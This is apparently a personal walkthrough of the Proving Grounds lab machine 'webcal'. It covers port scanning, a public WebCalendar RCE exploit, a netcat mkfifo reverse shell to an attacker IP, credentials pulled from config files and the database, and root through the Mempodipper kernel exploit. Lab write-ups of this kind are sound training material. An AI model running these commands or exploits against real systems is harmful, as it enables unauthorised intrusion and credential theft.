# Proving Grounds - webcal - 192.168.116.37

# Enumeration
## Nmap
### Inital Scan
Command
```
sudo nmap -A -vv -oA enum/nmap-initial 192.168.116.37
```

Output
```
PORT   STATE SERVICE REASON         VERSION                                                                                                                                                                                                  
21/tcp open  ftp     syn-ack ttl 63 Pure-FTPd                                                                                                                                                                                                
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 5.8p1 Debian 7ubuntu1 (Ubuntu Linux; protocol 2.0)                                                                                                                                               
| ssh-hostkey:                                                                                                                                                                                                                               
|   1024 5b:b4:3f:ad:ac:70:b3:6f:70:db:de:72:11:03:d7:1d (DSA)                                                                                                                                                                               
| ssh-dss AAAAB3NzaC1kc3MAAACBAP6wWpAlaYKQ87IRMm6Iu+3P90qRxgJv2uROs7M2YY44MTnLdchXHqqe85Su4wFeGc5+P3xeEnxPvTLOH0N+gKyKUqteMQP4w1gJP4W2oEX2tzAfqY8OqAm8/R/PDx8uWFS7Ivrc5b818lMkMMNYj74TVjdB14X0+xULCg+z6cDFAAAAFQD6yo22iGSzk1uVAgUPAXWatTYWUQA
AAIEAgQGQmf0qShFfvh8/1C0qoiZxThFjF3WZc1HXGuajdHqbYrDHiFd2db+7jtQ03WHTNv6sxFjrpPW1R0ZT0B9MJnzbSd7CAp//KYvc/ABQa3HhIIzDR24sx1tE/Jru49IsRfWMYobP3RLCpvu67XnqrNd3xEG6B6jMN1/wiITVBOQAAACBAMnnflla3oGLXF/H+wNn11JUgmfQvT/b3ln8Wei+PrRb6LcJ1rNGNOt4
+t6nREcbqhtaHChvuEM8mraoMznE2m3iz8DvFpfiwUevwJ/xc1naP3W59mPaWleRXOGbCSz4+KDmTqzagrbiOuC5TDR3w0wzVK8kW8MR9mZ4kMdh6ltF                                                                                                                         
|   2048 13:dc:ff:d4:03:51:a5:9f:0c:05:33:82:f0:4a:dd:21 (RSA)                                                                                                                                                                               
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCn7TiVoPeGyiTCtABhso46YSM8fsReiPNhyN8ItBfnPtJFUPgDlN1mxnuOv1Z2acDDxdGJ/JyhpxkrwFcQ1FtRJmj5Be/vzCdcBh/n8Ef7xgswGUSrHkHLQSocLLroxjOeVX7ClBDfpE3fNRdLPG2gDJAPbI6Xg3gFw9drZkMgoLB8RiSS8PLsuINTKDwkJsn5Twb
ZY3Xtk9en/U43gC6el4CQU4EPAmqasudGwo+l4YopS21vxXl0zKxp4a7PPZ6SvTzCzwPh3Q90zCiRzYplBMzorvrc2+9hLVZmI3HsB2RElSspyJ5kfR/vlVH936Tq1odeTTOzuGxnwkmh7ncd                                                                                            
|   256 fe:be:7f:91:5c:5e:64:78:0b:35:e4:73:1f:01:f5:a1 (ECDSA)                                                                                                                                                                              
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOjqngQVBATu6P7QvVoh3hrHvJgBX+QpB9fVBk++sVvxstZXwnCkaBicePfYEDCwUZy6LyWZ8qACNmee6tCe9/A=                                                                           
25/tcp open  smtp    syn-ack ttl 63 Postfix smtpd                                                                                                                                                                                            
|_smtp-commands: ucal.local, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,                                                                                                                            
| ssl-cert: Subject: commonName=ucal.local                                                                                                                                                                                                   
| Issuer: commonName=ucal.local                                                                                                                                                                                                              
| Public Key type: rsa                                                                                                                                                                                                                       
| Public Key bits: 2048                                                                                                                                                                                                                      
| Signature Algorithm: sha1WithRSAEncryption                                                                                                                                                                                                 
| Not valid before: 2013-01-14T10:28:18                                                                                                                                                                                                      
| Not valid after:  2023-01-12T10:28:18                                                                                                                                                                                                      
| MD5:   868e b63c 1333 1bec fa56 0f11 99de c7b3                                                                                                                                                                                             
| SHA-1: 7dab 07c5 c627 27f9 4c30 49fb da4b 2a78 d0f6 987c                                                                                                                                                                                   
| -----BEGIN CERTIFICATE-----                                                                                                                                                                                                                
| MIICpjCCAY4CCQDlg/bA0HIRzjANBgkqhkiG9w0BAQUFADAVMRMwEQYDVQQDEwp1                                                                                                                                                                           
| Y2FsLmxvY2FsMB4XDTEzMDExNDEwMjgxOFoXDTIzMDExMjEwMjgxOFowFTETMBEG                                                                                                                                                                           
| A1UEAxMKdWNhbC5sb2NhbDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB                                                                                                                                                                           
| ANlQVuW8KX5J3clVb2+lb63H+Ko7580L4XLoKLD3TqN2pdL7Vc5e9YaHnD3zaztr                                                                                                                                                                           
| xNWMUhYUsec5SpAtRdwue0Elm4oPT9+LMFXocn5j/P/ramdhWzaYPqYfvPzhmqNa                                                                                                                                                                           
| qbS9xztZVc7zsUWAM8BmsYbO3SMmsQoBtpd2l20d5x+0bt3v6tHlWaE2wQTd4kC7                                                                                                                                                                           
| bd3LAmgdXlBBFIn1RUfWZhGSmqrImyrqYl+hr+jSeWivf7XsUJ8hnQNqCKXmdmeV                                                                                                                                                                           
| qNzoiaccM/E0ht5JgUL/nMuVfjnKvP2PpDGx2HzE5SbMNGzJsen36r7bsOcWaweO                                                                                                                                                                           
| pOZXV49QSdvRHMyecgsKm4MCAwEAATANBgkqhkiG9w0BAQUFAAOCAQEASgiLLmO+                                                                                                                                                                           
| Uv50jzyG51dFlDKQtoNOIDo4deO2molm1JU9gV5ig1FaBygwu/S0XCFSe30UgAKh                                                                                                                                                                           
| 2Isr8HjSIxxMegCvVs2Neg8Wc+zjF+7VHd0Kk3RKRG6ljZPEbBcZR0nYUb9dMFvQ                                                                                                                                                                           
| 2k5KgslZaOPodsvG6BEXDE4wIXk/br9UQmdYur7I7mP//rDTGiokxsaAmFHaEZkS                                                                                                                                                                           
| yCO0A8qjw+7nALgYtJYUtL1tv77FgLlDsRvG+EGCf9G5iKjH+9d9Z1JbqwObUw+m                                                                                                                                                                           
| yo6sffN1/IbFXEmQTWm+u+0ZlDWnFvPLnaO5o85Y5PXf3WjU42olb8whfOKKYokL
| buqhqjD92xrwGQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2021-10-09T04:15:52+00:00; +4h00m00s from scanner time.
53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.7.3
| dns-nsid: 
|_  bind.version: 9.7.3
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.2.20 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.20 (Ubuntu)
|_http-title: Construction Page
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

### Full Scan
Command
```
sudo nmap -A -vv -p- -oA enum/nmap-full 192.168.116.37
```

Output
```
PORT   STATE SERVICE REASON         VERSION                                                                                                                                                                                                  
21/tcp open  ftp     syn-ack ttl 63 Pure-FTPd                                                                                                                                                                                                
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 5.8p1 Debian 7ubuntu1 (Ubuntu Linux; protocol 2.0)                                                                                                                                               
| ssh-hostkey:                                                                                                                                                                                                                               
|   1024 5b:b4:3f:ad:ac:70:b3:6f:70:db:de:72:11:03:d7:1d (DSA)                                                                                                                                                                               
| ssh-dss AAAAB3NzaC1kc3MAAACBAP6wWpAlaYKQ87IRMm6Iu+3P90qRxgJv2uROs7M2YY44MTnLdchXHqqe85Su4wFeGc5+P3xeEnxPvTLOH0N+gKyKUqteMQP4w1gJP4W2oEX2tzAfqY8OqAm8/R/PDx8uWFS7Ivrc5b818lMkMMNYj74TVjdB14X0+xULCg+z6cDFAAAAFQD6yo22iGSzk1uVAgUPAXWatTYWUQA
AAIEAgQGQmf0qShFfvh8/1C0qoiZxThFjF3WZc1HXGuajdHqbYrDHiFd2db+7jtQ03WHTNv6sxFjrpPW1R0ZT0B9MJnzbSd7CAp//KYvc/ABQa3HhIIzDR24sx1tE/Jru49IsRfWMYobP3RLCpvu67XnqrNd3xEG6B6jMN1/wiITVBOQAAACBAMnnflla3oGLXF/H+wNn11JUgmfQvT/b3ln8Wei+PrRb6LcJ1rNGNOt4
+t6nREcbqhtaHChvuEM8mraoMznE2m3iz8DvFpfiwUevwJ/xc1naP3W59mPaWleRXOGbCSz4+KDmTqzagrbiOuC5TDR3w0wzVK8kW8MR9mZ4kMdh6ltF                                                                                                                         
|   2048 13:dc:ff:d4:03:51:a5:9f:0c:05:33:82:f0:4a:dd:21 (RSA)                                                                                                                                                                               
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCn7TiVoPeGyiTCtABhso46YSM8fsReiPNhyN8ItBfnPtJFUPgDlN1mxnuOv1Z2acDDxdGJ/JyhpxkrwFcQ1FtRJmj5Be/vzCdcBh/n8Ef7xgswGUSrHkHLQSocLLroxjOeVX7ClBDfpE3fNRdLPG2gDJAPbI6Xg3gFw9drZkMgoLB8RiSS8PLsuINTKDwkJsn5Twb
ZY3Xtk9en/U43gC6el4CQU4EPAmqasudGwo+l4YopS21vxXl0zKxp4a7PPZ6SvTzCzwPh3Q90zCiRzYplBMzorvrc2+9hLVZmI3HsB2RElSspyJ5kfR/vlVH936Tq1odeTTOzuGxnwkmh7ncd                                                                                            
|   256 fe:be:7f:91:5c:5e:64:78:0b:35:e4:73:1f:01:f5:a1 (ECDSA)                                                                                                                                                                              
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOjqngQVBATu6P7QvVoh3hrHvJgBX+QpB9fVBk++sVvxstZXwnCkaBicePfYEDCwUZy6LyWZ8qACNmee6tCe9/A=                                                                           
25/tcp open  smtp    syn-ack ttl 63 Postfix smtpd                                                                                                                                                                                            
|_smtp-commands: ucal.local, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,                                                                                                                            
| ssl-cert: Subject: commonName=ucal.local                                                                                                                                                                                                   
| Issuer: commonName=ucal.local                                                                                                                                                                                                              
| Public Key type: rsa                                                                                                                                                                                                                       
| Public Key bits: 2048                                                                                                                                                                                                                      
| Signature Algorithm: sha1WithRSAEncryption                                                                                                                                                                                                 
| Not valid before: 2013-01-14T10:28:18                                                                                                                                                                                                      
| Not valid after:  2023-01-12T10:28:18                                                                                                                                                                                                      
| MD5:   868e b63c 1333 1bec fa56 0f11 99de c7b3                                                                                                                                                                                             
| SHA-1: 7dab 07c5 c627 27f9 4c30 49fb da4b 2a78 d0f6 987c                                                                                                                                                                                   
| -----BEGIN CERTIFICATE-----                                                                                                                                                                                                                
| MIICpjCCAY4CCQDlg/bA0HIRzjANBgkqhkiG9w0BAQUFADAVMRMwEQYDVQQDEwp1                                                                                                                                                                           
| Y2FsLmxvY2FsMB4XDTEzMDExNDEwMjgxOFoXDTIzMDExMjEwMjgxOFowFTETMBEG                                                                                                                                                                           
| A1UEAxMKdWNhbC5sb2NhbDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB                                                                                                                                                                           
| ANlQVuW8KX5J3clVb2+lb63H+Ko7580L4XLoKLD3TqN2pdL7Vc5e9YaHnD3zaztr                                                                                                                                                                           
| xNWMUhYUsec5SpAtRdwue0Elm4oPT9+LMFXocn5j/P/ramdhWzaYPqYfvPzhmqNa                                                                                                                                                                           
| qbS9xztZVc7zsUWAM8BmsYbO3SMmsQoBtpd2l20d5x+0bt3v6tHlWaE2wQTd4kC7                                                                                                                                                                           
| bd3LAmgdXlBBFIn1RUfWZhGSmqrImyrqYl+hr+jSeWivf7XsUJ8hnQNqCKXmdmeV                                                                                                                                                                           
| qNzoiaccM/E0ht5JgUL/nMuVfjnKvP2PpDGx2HzE5SbMNGzJsen36r7bsOcWaweO                                                                                                                                                                           
| pOZXV49QSdvRHMyecgsKm4MCAwEAATANBgkqhkiG9w0BAQUFAAOCAQEASgiLLmO+                                                                                                                                                                           
| Uv50jzyG51dFlDKQtoNOIDo4deO2molm1JU9gV5ig1FaBygwu/S0XCFSe30UgAKh                                                                                                                                                                           
| 2Isr8HjSIxxMegCvVs2Neg8Wc+zjF+7VHd0Kk3RKRG6ljZPEbBcZR0nYUb9dMFvQ                                                                                                                                                                           
| 2k5KgslZaOPodsvG6BEXDE4wIXk/br9UQmdYur7I7mP//rDTGiokxsaAmFHaEZkS                                                                                                                                                                           
| yCO0A8qjw+7nALgYtJYUtL1tv77FgLlDsRvG+EGCf9G5iKjH+9d9Z1JbqwObUw+m                                                                                                                                                                           
| yo6sffN1/IbFXEmQTWm+u+0ZlDWnFvPLnaO5o85Y5PXf3WjU42olb8whfOKKYokL
| buqhqjD92xrwGQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2021-10-09T04:18:28+00:00; +4h00m01s from scanner time.
53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.7.3
| dns-nsid: 
|_  bind.version: 9.7.3
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.2.20 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.20 (Ubuntu)
|_http-title: Construction Page
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

## Port 80

![](../Attachments/Pasted%20image%2020211008191631.png)

### Nikto
Command
```
nikto -h http://192.168.116.37 -o enum/nikto.txt
```

Output
```
---------------------------------------------------------------------------                                                                                                                                                                  
+ Server: Apache/2.2.20 (Ubuntu)                                                                                                                                                                                                             
+ Server may leak inodes via ETags, header found with file /, inode: 151315, size: 5105, mtime: Mon Jan 14 07:39:30 2013                                                                                                                     
+ The anti-clickjacking X-Frame-Options header is not present.                                                                                                                                                                               
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS                                                                                                                    
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type                                                                                    
+ Uncommon header 'tcn' found, with contents: list                                                                                                                                                                                           
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html             
+ Apache/2.2.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.                                                                                                                     
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS                                                                                                                                                                                             
+ Retrieved x-powered-by header: PHP/5.3.6-13ubuntu3.9                                                                                                                                                                                       
+ Cookie PHPSESSID created without the httponly flag                                                                                                                                                                                         
+ Cookie webcalendar_session created without the httponly flag                                                                                                                                                                               
+ OSVDB-3093: /webcalendar/login.php: This might be interesting... has been seen in web logs from an unknown scanner.                                                                                                                        
+ RFC-1918 IP address found in the 'location' header. The IP is "10.60.60.55".                                                                                                                                                               
+ OSVDB-3268: /icons/: Directory indexing found.                                                                                                                                                                                             
+ OSVDB-3233: /icons/README: Apache default file found.                                                                                                                                                                                      
+ 8725 requests: 0 error(s) and 15 item(s) reported on remote host                                                                                                                                                                           
+ End Time:           2021-10-08 19:23:00 (GMT-5) (305 seconds)                                                                                                                                                                              
--------------------------------------------------------------------------- 
```

### GoBuster
Command
```
gobuster dir -u http://192.168.116.37 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o enum/gobuster.txt
```

Output
```
===============================================================
/index                (Status: 200) [Size: 5105]
/resources            (Status: 301) [Size: 320] [--> http://192.168.116.37/resources/]
/send                 (Status: 200) [Size: 3168]                                      
/server-status        (Status: 403) [Size: 295]                                       
                                                                                      
===============================================================
```
 
---

# Vulnerabilities
## WebCalendar v1.2.3 Found via Nikto
![](../Attachments/Pasted%20image%2020211008192241.png)

Vulnerable to RCE https://www.exploit-db.com/exploits/18775

Ran script and gained access to RCE Webshell

```
php 18775.php 192.168.116.37 /webcalendar/
```

![](../Attachments/Pasted%20image%2020211008192712.png)

Executed reverse shell script from RCE shell
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.49.116 31337 >/tmp/f
```

Full Shell gained on target machine.

![](../Attachments/Pasted%20image%2020211008193011.png)

---

# Privilege Escalation
## Enum
/etc/apache2/httpd.conf
/etc/ldap
/etc/mysql/my.cnf
```
  $db_password = $settings['db_password'];
  $db_password = ( $db_password == 'none' ? '' : $db_password );
db_password: edjfbxMT7KKo2PPC
install_password: 2b793cda199e6d21d3de4c9906254ee8
  'SMTP_PASSWORD' => '',
```

### Databse information found in settings.php

![](../Attachments/Pasted%20image%2020211008204047.png)
```
wc:edjfbxMT7KKo2PPC
```

### Admin password hash found in Database

![](../Attachments/Pasted%20image%2020211009132141.png)

```
admin:cbb44d79209bee5af34457c3fafd4f1d
```

Password appears to be a MD5 hash.

![](../Attachments/Pasted%20image%2020211009132224.png)

Unable to crack password hash.

Able to change password to admin to "password" in mysql.
```
UPDATE webcal_user
SET cal_passwd = '5f4dcc3b5aa765d61d8327deb882cf99'
WHERE cal_login = 'Admin';
```

Unable to login to WebCalendar. Redirects to http://10.60.60.55/webcalendar/index.php when logging in.

![](../Attachments/Pasted%20image%2020211009140758.png)

### Kernal is vulnerable to Mempodipper vulnerability

https://git.zx2c4.com/CVE-2012-0056/plain/mempodipper.c / https://www.exploit-db.com/exploits/35161

![](../Attachments/Pasted%20image%2020211009141853.png)

Compiled the c file and transfered to target machine "/tmp" folder.
```
gcc -o mempodipper mempodipper.c
```

Set to allow execute and ran exploit.
```
chmod +x mempodipper
```

Root Shell gained

![](../Attachments/Pasted%20image%2020211009142227.png)

---

# Loot
## User
>745b78dce45552bddb674c3de3ec2304

Command
```
ip addr;id;hostname;cat local.txt
```

![](../Attachments/Pasted%20image%2020211008193238.png)

## Root/Admin
>271685c669811cc168f36de412097fe7

Command
```
ip addr;id;hostname;cat proof.txt
```

![](../Attachments/Pasted%20image%2020211009142340.png)